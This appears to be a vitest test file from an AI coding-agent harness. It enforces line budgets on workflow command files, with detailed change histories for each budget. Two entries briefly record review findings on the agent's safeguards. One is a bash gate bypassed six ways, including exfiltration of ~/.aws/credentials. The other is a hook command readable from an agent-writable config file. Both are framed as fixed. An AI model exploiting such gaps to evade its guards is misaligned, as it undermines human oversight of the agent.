/**
 * FLOW-11 -- the workflow line-budget registry, and the mechanism that
 * protects Phase 9 from itself (ROADMAP.md). GSD's own no-ceremony
 * `quick.md` is 1,169 lines (~15k tokens); Phase 9 adds `/grill`, `/plan`,
 * `/execute` and `/review`. This test is the only thing standing between
 * Phase 9 and that outcome, and it is worthless unless it also fails on a
 * workflow file it was never told about -- see the completeness describe
 * block below.
 *
 * A LINE MEANS A RAW LINE -- `readFileSync(f, "utf-8").split("\n").length`.
 * No comment stripping, no blank-line stripping, no parsing (decision D-1,
 * `docs/WORKFLOWS.md` section 3). Two reasons, not one:
 *   (a) a comment-excluding count measures a different artifact than the one
 *       that ships -- a heavily commented file could pass a "non-comment
 *       lines" budget while staying exactly as long to actually read;
 *   (b) any comment-excluding counter is a heuristic (string literals
 *       containing `//`, block comments, JSX-like text) and every heuristic
 *       is more gameable by reformatting than a raw count.
 *
 * D-8 -- THIS FILE IS THE SINGLE AUTHORITATIVE REGISTRY. `docs/WORKFLOWS.md`
 * deliberately carries no budget numbers of its own -- one copy of the
 * numbers, in the artifact that enforces them, rather than a doc table and a
 * test that can silently drift apart (this repo has been bitten by exactly
 * that twice already).
 *
 * D-11 -- THE DIRECTORY AGGREGATE IS A RATCHET WITH NO HEADROOM.
 * `DIRECTORY_BUDGETS`'s `workflows` entry is the measured total of
 * `.pi/extensions/workflows/**\/*.ts` at commit time (415 raw lines by this
 * file's own `countRawLines`, measured 2026-08-15: index.ts 79 + evidence.ts
 * 336, after iteration 3's CR-01/WR-02), rounded up to the next multiple of
 * ten. Growing the directory requires a deliberate edit to this number in the
 * SAME commit as the growth -- the same discipline `docs/RUNBOOK.md`
 * statuses already use. This is what stops `/quick` from being "shrunk" by
 * moving four hundred lines into a private helper module that only it calls.
 *
 * A future phase raises a budget by editing the number below, in the same
 * commit as the growth that needs it, with a one-line reason in `why` -- it
 * does not delete the entry, and it does not touch the ceiling test.
 *
 * D-12 (PLAN 09-02) -- THE SIDEWAYS-RATCHET CLOSURE IS SCOPED TO WHAT WAS
 * GENUINELY INVISIBLE, NOT RE-COVERED WHAT ALREADY HAD A HOME. The `.md`
 * skill/prompt-body half of Item 1's hole was ALREADY closed before this
 * plan touched this file: {@link discoverWorkflowFiles} (:553-584) already
 * globs every `.pi/skills/**\/*.md` and `.pi/prompts/**\/*.md` file, and the
 * registry-completeness check (:1027-1040) already requires a
 * WORKFLOW_BUDGETS entry for each one. `RESOURCE_EDGES` and
 * {@link resourceEdgeCandidates} below cover only the three edges that were
 * genuinely reachable by NOTHING: (i) `.pi/agents/*.md` (zero glob coverage
 * anywhere in this file before this plan), (ii) a non-`.md` asset nested
 * inside a skill/prompt directory (walked by {@link walkOnDisk}, then
 * dropped by {@link discoverWorkflowFiles}'s own `.endsWith(".md")` filter),
 * and (iii) a `.pi/`-shaped path literal in a discovered source that is not
 * already a resolved static import. Re-covering (i)/(ii)'s `.md` half again
 * would have been Pitfall 3 from `09-RESEARCH.md` -- a second mechanism
 * guarding a hole this file already closes, spending this phase's own line
 * budget on redundancy.
 *
 * D-13 (PLAN 09-02) -- `WORKFLOW_TEXT_BUDGETS`'S CEILING IS A SPEC NUMBER,
 * NOT A MEASUREMENT. Every OTHER registry in this file states `budget ===
 * Math.ceil(actual / 10) * 10` -- the number tracks the file. `FEATURES_CEILINGS`
 * inverts that: the file must track the number, sourced verbatim from
 * `.planning/research/FEATURES.md` Part 2 (`/grill` <=250 line 158, `/plan`
 * <=200 + `/execute` <=250 line 183, `/review` <=250 line 206, `/quick`
 * <=100 line 238's harder ceiling). Raising `FEATURES_CEILINGS` to make a
 * failing assertion pass is the exact failure mode this mechanism exists to
 * catch -- see Falsification 5 in `09-02-SUMMARY.md`.
 *
 * WR2-03 (ITERATION 3) -- THE ROUNDING RULE IS NOW ASSERTED, NOT RESTATED.
 * Every `why` says "measured N raw lines ... rounded up to the next ten".
 * Re-measured with `countRawLines` -- the function the assertions actually
 * use -- five of six raises from the previous fix pass carried TEN MORE lines
 * than that rule yields, and several `why` figures were CONTENT-line counts
 * (one short per file), i.e. produced by a different method than the one they
 * documented. No single entry was a disguised relaxation and the
 * anti-offloading control did fire as designed; the problem is that a
 * maintainer re-measuring by the documented method got different numbers and
 * could not tell drift from a rounding habit. So both registries now carry a
 * `budget === Math.ceil(actual / 10) * 10` assertion.
 *
 * `toBe`, not `toBeLessThan(actual + 10)`: the registry must state the
 * CURRENT measured figure, so a file that SHRINKS also requires the edit.
 * Headroom accumulated by shrinking is exactly the slack a ratchet exists to
 * prevent, and unlike growth it accumulates silently.
 *
 * WR-03 -- THE RATCHET APPLIES TO EVERY COMMAND DIRECTORY, NOT ONLY
 * `workflows/`. A per-file budget alone lets a command file stay small while
 * an unbudgeted sibling in the SAME directory grows without limit -- proved
 * by planting a 3-line `.pi/extensions/grill/index.ts` (spells
 * `registerCommand(`) beside a 1,200-line `.pi/extensions/grill/steps.ts`:
 * the file-level completeness check named only `index.ts`, and `steps.ts`
 * would have shipped unbudgeted. `DIRECTORY_BUDGETS` and
 * {@link filesInDir} close this: every directory holding a discovered
 * command source is ratcheted over its WHOLE `.ts`/`.js` total, including
 * files that do not themselves spell `registerCommand(`. `routing/`,
 * `harness/` and `diagnostics/` are grandfathered in at their CURRENT
 * measured totals -- this pass did not re-review their tightness, exactly
 * per WR-05's own precedent for their per-file entries.
 *
 * WR-01 (ITERATION 3) -- THE AGGREGATE WAS DEFEATED BY ONE SUBDIRECTORY.
 * The prior `filesInDir` excluded any path with an extra `/` segment past
 * `dir`, and `commandDirs` used the command file's IMMEDIATE PARENT rather
 * than the subsystem root -- so `.pi/extensions/workflows/helpers/big.ts`
 * (planted, 1,201 lines, no `registerCommand(`) was never summed by anything
 * at all, and a nested command file (`.pi/extensions/grill/sub/index.ts`)
 * would have ratcheted only `grill/sub`, leaving `grill/steps.ts` beside it
 * uncounted. `filesInDir` now recurses (dropping the depth filter --
 * `walkOnDisk` and `git ls-files` both already recurse); `commandDirs` now
 * maps to `p.split("/").slice(0, 3).join("/")`, the subsystem root, not the
 * immediate parent.
 */
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from "node:fs";
import { dirname, join, relative, resolve } from "node:path";
import { describe, expect, it } from "vitest";
import { repoRoot, trackedFiles } from "../helpers/git.ts";

const WORKFLOWS_DIR = ".pi/extensions/workflows";
const PROMPTS_DIR = ".pi/prompts";
const SKILLS_DIR = ".pi/skills";
/** WR-05: every command surface can hide outside `workflows/` too -- see {@link isCommandSource}. */
const EXTENSIONS_DIR = ".pi/extensions";
/** D-12 (PLAN 09-02): the genuinely-invisible resource-edge root -- see {@link resourceEdgeCandidates}. */
const AGENTS_DIR = ".pi/agents";
/** A file containing this text registers a `/command` directly -- WR-05's "what a file IS, not where it sits". */
const COMMAND_MARKER = "registerCommand(";

/**
 * The single authoritative registry (D-8). Raising a number here is a
 * visible, reviewable diff with a mandatory `why` -- it is never a silent
 * relaxation, and it never deletes a prior entry.
 */
const WORKFLOW_BUDGETS: readonly { file: string; budget: number; why: string }[] = [
	{
		file: ".pi/extensions/background-tasks/src/extension.ts",
		budget: 1000,
		why: "08.1-05 (UPG-04)'s vendored pi-background-tasks@2.6.9, process-only: registers /bg, /tasks, /bg-tasks, " +
			"/bg-clear, /jobs, /logs and /kill. Upstream's own size after trimming the delegate/fusion/attested " +
			"registrations and the update check (see .pi/extensions/background-tasks/PROVENANCE.md); not hand-written " +
			"workflow logic. Measured 988 raw lines 2026-10-13, rounded up to the next ten. RAISED 990 -> 1000 by the 08.1 review fixes (WR-01 local patch: guardBgRun call in bg_run execute(), PROVENANCE deviation 8); re-measured 992 raw lines 2026-10-13, rounded up to the next ten",
	},
	{
		file: ".pi/extensions/workflows/index.ts",
		budget: 100,
		why: "FLOW-01 -- the ROADMAP's /quick raw-line ceiling. RAISED 80 -> 100 by plan 08-11 (GATE-01): /quick now " +
			"calls quality/index.ts#runQuickGateStage after the git pre-flight and before startRun, blocks with " +
			"gate.report on a failing leg, and drains-and-discards takeQualityCost() on that branch with its own " +
			"four-part comment (why the drain exists, why discarding beats a fabricated {qualityMs:0}, why nothing " +
			"measurable is lost, why this is a deliberate second call site outside diagnostics/) -- all of THIS " +
			"FILE'S OWN growth (the call site, the branch, the comment) lives here per the plan's own instruction " +
			"not to inline gate/leg logic elsewhere, so THAT growth is real and visible here rather than offloaded. " +
			"CR-04 (code-review fix pass) named the residual overclaim: the gate/leg logic itself (3,400+ lines) " +
			"was placed in .pi/extensions/quality/, which this registry's commandDirs discovery could not see " +
			"(quality/ spells no registerCommand( anywhere) -- see the .pi/extensions/quality DIRECTORY_BUDGETS " +
			"entry below and importedSubsystemDirs, which closes that hole for future subsystems too. Plan 08-12 " +
			"(GATE-01's tree-comparison branch) then passed " +
			"currentTree(ctx.cwd) alongside currentSha(ctx.cwd) at both startRun and agent_end call sites, inside " +
			"the same try/catch as before -- no new branch of control flow, one import and two call-site edits. " +
			"Measured 95 raw lines 2026-08-15. Code-review fix pass WR-06: takeQualityCost() on the blocking " +
			"branch drained the WHOLE process-wide ledger, not just this gate's own contribution, silently erasing " +
			"any other contributor's already-recorded cost from earlier in the same still-in-progress turn -- " +
			"replaced with refundQualityCost({ms: gate.totalMs}), which subtracts only its own input. Re-measured " +
			"96 raw lines 2026-08-15, rounded up to the next ten. Still well under the ROADMAP's own " +
			"\"above 100 it has FAILED\" line. CORRECTED by plan 09-02 (09-RESEARCH.md Pitfall 2): that " +
			"96 figure was already three lines stale by the time it was written -- re-measured with " +
			"countRawLines and confirmed 99 raw lines 2026-08-15, still rounding up to the same 100. Re-measured 84 raw lines 2026-10-13 after " +
			"the comment cleanup, rounded up to the next ten. Re-measured 86 raw lines after its settle handler began deferring to an armed /execute run, rounded up to the next ten Re-measured 92 raw lines 2026-10-13 after /quick began refusing a dirty working tree before arming, rounded up to the next ten, still inside the frozen 100-line /quick ceiling.",
	},
	{
		file: ".pi/extensions/workflows/evidence.ts",
		budget: 320,
		why: "CR-01 iteration 3 fix: recordCaptureFailure() so a tool_execution_end capture that throws " +
			"rejects instead of vanishing, plus the tool_execution_end docstring rewrite -- measured 336 " +
			"raw lines 2026-08-15 (up from 328), rounded up to the next ten. RAISED 340 -> 390 by plan 08-12 " +
			"(GATE-01): gateCompletion gained a sixth ordered branch (headTree === baseTree, positioned between " +
			"branches (2) and (3), with the docstring explaining why), startRun/endRun now thread baseTree/headTree " +
			"through RunState, and the WHAT THIS PREDICATE DOES NOT PROVE paragraph was rewritten to state the " +
			"narrower, still-true unrelated-content limit rather than the now-closed empty-commit one. Measured " +
			"381 raw lines 2026-08-15. Re-measured 242 raw lines 2026-10-13 after the comment cleanup, rounded up to the next ten. Re-measured 238 raw lines 2026-10-13 after the evidence gate began passing on a commit plus the declared verification, with failed calls logged, rounded up to the next ten Re-measured 258 raw lines 2026-10-13 after the gate began requiring HEAD to be a new commit on the base, rounded up to the next ten. Re-measured 280 raw lines 2026-10-13 after endRun stopped writing and each run began writing exactly one row with its final verdict (RunSummary, writeRunEvidence), already a multiple of ten. Re-measured 304 raw lines 2026-10-13 after a run was bound to the prompt that starts it (isRunPending, notePromptForRun), rounded up to the next ten. Re-measured 300 raw lines 2026-10-13 after the comment cleanup, already a multiple of ten. RAISED 300 -> 320: onlyCommitsSince requires every commit after the base to be a non-merge commit made after the run was armed, so a pull, merge or cherry-pick rejects; 316 raw lines",
	},
	{
		file: ".pi/extensions/workflows/settle.ts",
		budget: 90,
		why: "the /quick change gate placement: runs the deterministic change gate on base..HEAD once on agent_settled, with the aborted-turn rule. Measured 65 raw lines 2026-10-13 with countRawLines, rounded up to the next ten Re-measured 72 raw lines 2026-10-13 after the settle began refusing a working tree that is not the commit, rounded up to the next ten. Re-measured 90 raw lines 2026-10-13 after notePrompt and the shared in-flight message, already a multiple of ten.",
	},
	// WR-05: these three are NOT under workflows/ -- discovered because they contain
	// COMMAND_MARKER (isCommandSource). Declared here so the completeness check
	// below stays green; each keeps its OWN prior phase's size as its budget, not
	// a number this phase re-reviewed for tightness.
	{
		file: ".pi/extensions/routing/index.ts",
		budget: 470,
		why: "Phase 5's mode-switch commands (/mode, /escalate, ...) -- WR-05 widened discovery to catch command surfaces outside workflows/; measured 313 raw lines 2026-08-14, rounded up to the next ten. RAISED 320 -> 340: the profile wiring stopped narrowing a session whose transcript already declared tools and gained a pre-prompt pass (now on `input`) that drops only undeclared out-of-profile tools; measured 336 raw lines 2026-10-13, rounded up to the next ten. Re-measured 389 raw lines 2026-10-13 after model_select and input enforcement of the model guard and the pinned subagent routing, rounded up to the next ten. RAISED 390 -> 400: the input backstop takes the image need from the prompt's own attachments, and subagent children skip the planner-pin bookkeeping; 392 raw lines. RAISED 400 -> 430: model_select reports a failed revert and the resulting thinking level, keeps a thinking-only refusal by turning thinking off, and names a persisted default; the input backstop passes workflow prompts and only warns on an overfull context; 422 raw lines RAISED 430 -> 470 (2026-10-13): a fresh session resets to the default mode and applies its executor unless a model was chosen explicitly, and the pins and /mode share one picker; 467 raw lines.",
	},
	{
		file: ".pi/extensions/harness/index.ts",
		budget: 70,
		why: "boot-phase harness commands -- WR-05 widened discovery to catch command surfaces outside workflows/; measured 63 raw lines 2026-10-13, rounded up to the next ten. Re-measured 61 on 2026-10-13 after the 08.2 review fix WR-06 (forced-prompt branch also sets the section). Re-measured 65 on 2026-10-13 with the OpenSpec opt-out env, rounded up to the next ten",
	},
	{
		file: ".pi/extensions/diagnostics/budget.ts",
		budget: 450,
		why: "Phase 2's /budget command -- WR-05 widened discovery to catch command surfaces outside workflows/; measured 435 raw lines 2026-08-14, rounded up to the next ten. Re-measured 441 on 2026-10-13 after the per-turn floor field and row (FLOOR_LABEL, floor, one computed value, one rendered row)",
	},
	{
		file: ".pi/extensions/checkpoint/index.ts",
		budget: 130,
		why: "Phase 7 plan 03 (EXT-07)'s /checkpoint-restore command -- WR-05 widened discovery to catch " +
			"command surfaces outside workflows/; measured 161 raw lines 2026-08-15, rounded up to the next ten. " +
			"RAISED 170 -> 240 by the Phase 7 code-review fix pass, for four findings that all land in this " +
			"one file: WR-12 (the fork handler took the NEWEST checkpoint sharing an entry id, which for " +
			"consecutive tool-less turns is a LATER snapshot than the fork point), WR-13 (every call site " +
			"passed ctx.cwd where the callee documented a repository root), WR-14 (the stored label was a " +
			"duplicate of entryId), and WR-16 (the headless branch called ctx.ui.notify, which is Pi's " +
			"noOpUIContext `notify: () => { }` at dist/core/extensions/runner.js:92 -- it emitted nothing, " +
			"so the branch was identical to the upstream return it was presented as fixing). Each carries " +
			"the citation or the worked example that makes it checkable, which is the point. " +
			"Re-measured 229 raw lines 2026-08-15, rounded up to the next ten. RAISED 240 -> 250 by the " +
			"iteration-3 fix pass for CR2-03: both restore call sites now name the undo sha and the count of " +
			"files removed, because a restore that deletes post-checkpoint work silently is the failure mode " +
			"that finding IS. Re-measured 244 raw lines 2026-08-15. Re-measured 130 raw lines 2026-10-13 after the comment cleanup",
	},
	{
		file: ".pi/extensions/loop-police/loop-police.ts",
		budget: 1310,
		why: "Phase 7 plan 06 (EXT-05/EXT-10)'s vendored pi-loop-police@1.14.1, registers /loop-police -- " +
			"WR-05 widened discovery to catch command surfaces outside workflows/; this is upstream's own " +
			"size plus a short vendoring-fix comment (see .pi/extensions/loop-police/PROVENANCE.md), " +
			"measured 1237 raw lines 2026-08-15, rounded up to the next ten. RAISED 1240 -> 1290 by the " +
			"Phase 7 code-review fix pass: WR-17 found HOOK_CMD -- an arbitrary command run via pi.exec on " +
			"every detection -- was read from loop-police.json INSIDE the working tree, which the agent " +
			"writes with an ordinary write/edit the bash tool_call guard never sees. Both egress keys are " +
			"now pinned to the environment, and the block explaining why is the part a future vendoring " +
			"bump most needs to keep. Re-measured 1276 raw lines 2026-08-15, rounded up to the next ten. " +
			"RAISED 1290 -> 1310 for WR2-04: that block claimed a live hook value is 'never persisted to " +
			"disk either', which was true of the MODULE-INIT write only -- `/loop-police save` serialises " +
			"cfg, which by then holds the environment value. Both writers now blank the two egress keys, " +
			"and the note says which claim was wrong. Re-measured 1303 raw lines 2026-08-15",
	},
	{
		file: ".pi/extensions/plan-mode/index.ts",
		budget: 550,
		why: "Phase 7 plan 07 (EXT-05/EXT-06)'s vendored Pi bundled example examples/extensions/plan-mode/index.ts " +
			"-- WR-05 widened discovery to catch command surfaces outside " +
			"workflows/; upstream's own 390 lines plus this plan's vendoring header (the only permitted " +
			"addition -- code body otherwise unchanged apart from the /todos -> /plan-todos rename), measured " +
			"460 raw lines 2026-08-15, rounded up to the next ten. RAISED 470 -> 500 by the Phase 7 " +
			"code-review fix pass: CR-03 found the bash gate here called a first-word regex predicate that " +
			"the review defeated six ways, including an exfiltration of ~/.aws/credentials. The gate now " +
			"calls ./read-only.ts and the file carries DEVIATION 4, the vendoring record for the only " +
			"BEHAVIOURAL change ever made to this copy -- a deviation a future Pi bump must see. " +
			"Then RAISED 500 -> 540 in the same pass for WR-18: NORMAL_MODE_TOOLS silently omitted " +
			"grep/find/ls/questionnaire, and the three PURE selectors were hoisted out of the extension " +
			"factory and exported (DEVIATION 5) because the round-trip property was otherwise untestable. " +
			"The reachability trace showing the review's stated path does NOT hold is recorded there too, " +
			"rather than the finding being overstated. Re-measured 534 raw lines 2026-08-15 with " +
			"countRawLines, rounded up to the next ten -- the figure previously stated here was 529, a " +
			"CONTENT-line count, which is not the function the assertion uses (WR2-03). " +
			"CORRECTED by plan 09-03: this entry's earlier clause naming both commands this file registers " +
			"was true when written and is now FALSE -- DEVIATION 6 (plan 09-03) renamed the shorter, " +
			"unhyphenated one to /plan-mode, a genuine composition conflict with Phase 9's ceremonial /plan " +
			"workflow (.planning/research/FEATURES.md Part 2), resolved the same way DEVIATION 1 resolved " +
			"the /todos collision: the general name goes to the authored workflow, the vendored example " +
			"takes the more specific one. The rename plus DEVIATION 6's header paragraph consumed the " +
			"6 lines of headroom this entry's own docstring already flagged as narrow. RAISED 540 -> 550. " +
			"Re-measured 547 raw lines 2026-08-15 with countRawLines, rounded up to the next ten",
	},
	{
		file: ".pi/extensions/todo.ts",
		budget: 360,
		why: "Phase 7 plan 08 (EXT-05/EXT-06)'s vendored Pi bundled example examples/extensions/todo.ts, " +
			"registers the `todo` tool and /todos -- WR-05 widened discovery to catch command surfaces outside " +
			"workflows/; upstream's own 297 lines plus this plan's vendoring header (the only permitted " +
			"addition -- code body otherwise unchanged), measured 357 raw lines 2026-08-15 with countRawLines, " +
			"rounded up to the next ten -- the figure previously stated here was 352, a CONTENT-line count, " +
			"which is not the function the assertion uses (WR2-03)",
	},
	{
		file: ".pi/extensions/grill/index.ts",
		budget: 180,
		why: "plan 09-08 (FLOW-02/FLOW-03) -- the /grill command itself: two entry points (a description, or the " +
			"literal --resume), the git pre-flight copied verbatim from workflows/index.ts, slug " +
			"derivation/resolution via .pi/lib/work-artifacts.ts#workDir, and writeSpecIfGated -- the ONLY " +
			"function in this subsystem that writes SPEC.md, running gateRequirementsAuthorship then " +
			"validateSpec then gateAmbiguity before any write. Measured 110 raw lines 2026-08-15 with " +
			"countRawLines, rounded up to the next ten. Re-measured 162 raw lines after the settle hook began gating each turn's SPEC.md, rounded up to the next ten. Re-measured 171 raw lines after /grill began git-ignoring the harness state directories, rounded up to the next ten. Re-measured 175 raw lines after /grill began refusing a slug with an earlier ledger, rounded up to the next ten",
	},
	{
		file: ".pi/skills/grill/SKILL.md",
		budget: 60,
		why: "plan 09-08 (FLOW-02) -- the first real skill body in this repository: the interrogation " +
			"procedure, the four ambiguity dimensions, the perspective rotation and the SPEC.md §1-§8 outline, " +
			"each as a table per 09-RESEARCH.md Item 1(d) and 09-PATTERNS.md Group H's own precedent (tables " +
			"are the right shape for this content, not a trick to cheat the line counter -- D-1, tables count " +
			"fully). Measured 58 raw lines 2026-08-15 with countRawLines, rounded up to the next ten",
	},
	{
		file: ".pi/extensions/plan-ceremony/index.ts",
		budget: 160,
		why: "plan 09-10 (FLOW-06) -- the /plan command itself: one entry point, no flags, the git pre-flight " +
			"copied verbatim from workflows/index.ts, slug resolution via candidateSlugsWithSpec/resolveSlug " +
			"(refusing rather than picking on ambiguity), the SPEC pre-flight (existence then validateSpec, " +
			"re-run every invocation), and writePlanIfGated -- the ONLY function in this subsystem that writes " +
			"PLAN.md, re-validating the on-disk SPEC.md and deriving its requirement ids before ever calling " +
			"validatePlan. Measured 140 raw lines 2026-08-15 with countRawLines, already an exact multiple of ten. Re-measured 142 raw lines after the settle hook began gating each turn's PLAN.md, rounded up to the next ten. Re-measured 155 raw lines after the workflow commands began retiring each other's per-turn hooks, rounded up to the next ten",
	},
	{
		file: ".pi/extensions/execute/index.ts",
		budget: 230,
		why: "plan 09-13 (FLOW-07) -- the /execute command: slug resolution, git pre-flight, on-disk SPEC/PLAN revalidation, " +
			"the write allowance, gate depth via gateDepthFor, the honest subagent probe, evidence arming reused from " +
			"workflows/evidence.ts, and the settle handler that appends PROGRESS.md only on the accept arm. Measured 142 raw " +
			"lines 2026-10-13 with countRawLines, rounded up to the next ten. Re-measured 149 raw lines after the verification run began being captured by tool call id, rounded up to the next ten. Re-measured 153 raw lines after the deterministic gate began re-running on the committed change, rounded up to the next ten. Re-measured 156 raw lines after the drift base began being pinned per slug, rounded up to the next ten. Re-measured 157 raw lines after done detection began ignoring fenced output, rounded up to the next ten. Re-measured 160 raw lines after the work-dir exclusion check was wired in, rounded up to the next ten. Re-measured 164 raw lines after the revision cap became a refusal with an explicit --reset, rounded up to the next ten. Re-measured 165 raw lines after the delegated brief began naming its agent, rounded up to the next ten. Re-measured 172 raw lines after the verification run and the settle gate began requiring a clean working tree, rounded up to the next ten. Re-measured 183 raw lines after a leaked /execute run began being cleared, rounded up to the next ten. Re-measured 194 raw lines after the user-approved --rebase-base re-pin was added, rounded up to the next ten Re-measured 202 raw lines 2026-10-13 after the task list and verification commands were pinned in the signed ledger, rounded up to the next ten. Re-measured 217 raw lines 2026-10-13 after the settle began writing one evidence row per run with its final verdict, rounded up to the next ten. Re-measured 222 raw lines 2026-10-13 after the run was bound to its own prompt, rounded up to the next ten. Re-measured 217 raw lines 2026-10-13 after the settle's HEAD and tree reads became non-throwing git calls, rounded up to the next ten.. RAISED 220 -> 230: /execute runs the executor guard before arming, since the routing backstop lets workflow prompts through; 221 raw lines, inside the frozen 250-line /execute ceiling. Unchanged at 230 after the pin gained each task line, its requirement ids and a SPEC.md hash, and --repin was added; 230 raw lines",
	},
	{
		file: ".pi/extensions/review/index.ts",
		budget: 170,
		why: "plan 09-15 (FLOW-08) -- the /review command: slug resolution, git pre-flight, on-disk SPEC/PLAN revalidation, the six-part reviewer contract, gate depth via gateDepthFor, refute-or-promote before the stop decision, REVIEW.md as the single write, and the MR step through openMr. Measured 124 raw lines 2026-10-13 (named git maxBuffer constant) with countRawLines, rounded up to the next ten. Re-measured 131 raw lines after the deterministic gate began running at HEAD, rounded up to the next ten. Re-measured 133 raw lines after undeclared changes began requiring approval, rounded up to the next ten. Re-measured 125 raw lines after the MR body stopped travelling through a temp file, rounded up to the next ten. Re-measured 129 raw lines after the history and upstream preconditions were wired in, rounded up to the next ten. Re-measured 130 raw lines after the gate notice began naming only what runs, rounded up to the next ten. Re-measured 133 raw lines after the deterministic gate began checking the work repo's changed files, rounded up to the next ten. Re-measured 143 raw lines after the attempt log, drift base and accepted entries moved to the signed ledger, rounded up to the next ten. Re-measured 151 raw lines after /review began git-ignoring the harness state directories, rounded up to the next ten. Re-measured 166 raw lines 2026-10-13 after the MR audit row, verdict gating and the merge-base rule were wired in, rounded up to the next ten Re-measured 171 raw lines 2026-10-13 after the task-pin check and the import-graph placeholder filter, rounded up to the next ten. LOWERED 180 -> 170: the task-pin check became one pinMismatch call that also covers the SPEC hash; 170 raw lines",
	},
	{
		file: ".pi/skills/plan-ceremony/SKILL.md",
		budget: 50,
		why: "plan 09-10 (FLOW-06) -- the task-line grammar, the both-directions coverage rule, the three " +
			"PLAN.md parts each with a named consumer, and the 'what will refuse you' list, each as a table " +
			"per grill/SKILL.md's own precedent. Measured 44 raw lines 2026-08-15 with countRawLines, rounded " +
			"up to the next ten",
	},
];

/**
 * D-11 / WR-03: the directory-level anti-offloading registry. Every
 * directory that holds at least one discovered command source (per
 * {@link isCommandSource}) must appear here, ratcheted over the WHOLE
 * `.ts`/`.js` total of that directory -- see {@link filesInDir}. See the
 * module docstring's WR-03 section for the planted-`grill/` proof of why a
 * per-file budget alone is insufficient.
 */
const DIRECTORY_BUDGETS: readonly { dir: string; budget: number; why: string }[] = [
	{
		dir: ".pi/extensions/background-tasks",
		budget: 10350,
		why: "08.1-05 (UPG-04) -- vendored pi-background-tasks@2.6.9 trimmed to the process feature (D-02); " +
			"upstream's source, not authored logic (PROVENANCE.md lists every file and deviation). Measured 10345 raw " +
			"lines across 14 files 2026-10-13, rounded up to the next ten. Re-measured 10340 after the 08.1 review fixes (CR-01 shell-default patch in common.ts shrank it by 9 lines, execute() guard added 4; PROVENANCE deviations 7-8), rounded up to the next ten. Re-measured 10343 after the bg_run gate in shell-policy.ts (3 added lines of code, PROVENANCE deviation 9), rounded up to the next ten",
	},
	{
		dir: WORKFLOWS_DIR,
		budget: 510,
		why: "D-11's original ratchet -- /quick's own directory; measured 415 raw lines 2026-08-15 " +
			"(index.ts 79 + evidence.ts 336) after iteration 3's CR-01/WR-02, rounded up to the next ten. " +
			"RAISED 420 -> 430 by plan 08-11 (GATE-01 wiring) -- see the per-file entry above for what grew. " +
			"Re-measured 430 raw lines 2026-08-15 (index.ts 94 + evidence.ts 336), already an exact multiple " +
			"of ten. RAISED 430 -> 480 by plan 08-12 (GATE-01's tree-comparison branch) -- see both per-file " +
			"entries above for what grew. Re-measured 476 raw lines 2026-08-15 (index.ts 95 + evidence.ts 381), " +
			"rounded up to the next ten. Code-review fix pass WR-06 (see the per-file entry above): re-measured " +
			"477 raw lines 2026-08-15 (index.ts 96 + evidence.ts 381). Re-measured 326 raw lines 2026-10-13 (index.ts 84 + evidence.ts 242), rounded up to the next ten. Re-measured 328 raw lines after index.ts began deferring to an armed /execute run, rounded up to the next ten. Re-measured 332 raw lines after /quick began clearing a leaked /execute run and claiming the session, rounded up to the next ten. Re-measured 386 raw lines 2026-10-13 after settle.ts was added (index.ts 83, evidence.ts 238, settle.ts 65), rounded up to the next ten Re-measured 406 raw lines 2026-10-13 (evidence.ts 258, index.ts 83, settle.ts 65) after the ancestry check, rounded up to the next ten. Re-measured 414 raw lines 2026-10-13 (evidence.ts 258, index.ts 84, settle.ts 72) after the dirty-tree refusal, rounded up to the next ten. Re-measured 448 raw lines 2026-10-13 (evidence.ts 280, index.ts 89, settle.ts 79) after one evidence row per run and the unverified verdict, rounded up to the next ten. Re-measured 451 raw lines 2026-10-13 (evidence.ts 280, index.ts 92, settle.ts 79) after the dirty-tree refusal at arm time, rounded up to the next ten. Re-measured 491 raw lines 2026-10-13 (evidence.ts 304, index.ts 97, settle.ts 90) after binding a run to its own prompt, rounded up to the next ten. Re-measured 488 raw lines 2026-10-13 (evidence.ts 301) after the comment cleanup, rounded up to the next ten. RAISED 490 -> 510: evidence.ts gained onlyCommitsSince; 501 raw lines (evidence.ts 316, index.ts 96, settle.ts 89)",
	},
	{
		dir: ".pi/extensions/routing",
		budget: 1620,
		why: "WR-03 widened the ratchet to every command directory, not only workflows/ -- measured 1019 " +
			"raw lines across 5 files 2026-10-13, rounded up to the next ten. RAISED 1020 -> 1110: profiles.ts (78 lines, " +
			"the tool-profile table and resolver) plus 5 lines of wiring in index.ts. Re-measured 1102 raw lines across 6 files 2026-10-13. " +
			"RAISED 1110 -> 1120: index.ts grew by the transcript-loadout guard and the pre-prompt pass (see its per-file entry); " +
			"measured 1120 raw lines across 6 files 2026-10-13. RAISED 1120 -> 1130: an explicit --tools allowlist now bypasses " +
			"narrowing (hasExplicitToolAllowlist in profiles.ts plus 2 lines in index.ts); measured 1121 raw lines across 6 files " +
			"2026-10-13, rounded up to the next ten. Re-measured 1341 raw lines 2026-10-13 after the model guard, per-mode agent overrides and enforcement of the routing profile (agent-overrides.ts 283, guard.ts 130, index.ts 389, modes.ts 321, profiles.ts 83, schema.ts 135), rounded up to the next ten. RAISED 1350 -> 1440: agent-overrides.ts records per-key pins with owner pids and restores only when every owner has ended, and both it and pickConfiguredCandidate apply the Bedrock prefix through resolveBedrockRef; nestedNeed sizes a nested call from its own request; 1434 raw lines (agent-overrides.ts 356, guard.ts 138, index.ts 392, modes.ts 330). RAISED 1440 -> 1470 for the same model_select and input changes in index.ts; 1464 raw lines. RAISED 1470 -> 1510: loader.ts registers bg_enable, which loads questionnaire and the bg_* tools on demand so the implement floor stays at 2342 tokens; 1508 raw lines (index.ts 424, loader.ts 40, profiles.ts 85). RAISED 1510 -> 1520: guard.ts names CHARS_PER_TOKEN and the best-effort catches in index.ts state their NEVER THROWS contracts; 1512 raw lines (guard.ts 141, index.ts 425). RAISED 1520 -> 1560: the planner pin owners carry a time and expire after 24 hours, a default-mode session writes its own pin while another stands, and /mode reports the pinned planner; 1556 raw lines (agent-overrides.ts 397, index.ts 428) LOWERED 1560 -> 1550 (2026-10-13): bedrockProfilePrefix reads through the shared settings reader; 1548 raw lines. RAISED 1550 -> 1630 (2026-10-13): freshSessionPlan and savedDefaultModel in modes.ts, the registry-aware pin in agent-overrides.ts and the default-executor step in index.ts; 1627 raw lines. LOWERED 1630 -> 1620 (2026-10-13): only a command-line model flag opts out of the default executor, so savedDefaultModel and the explicit-choice notice are gone; 1613 raw lines.",
	},
	{
		dir: ".pi/extensions/harness",
		budget: 90,
		why:
			"WR-03; measured 80 raw lines across 2 files 2026-10-13, rounded up to the next ten. RAISED 80 -> 90 " +
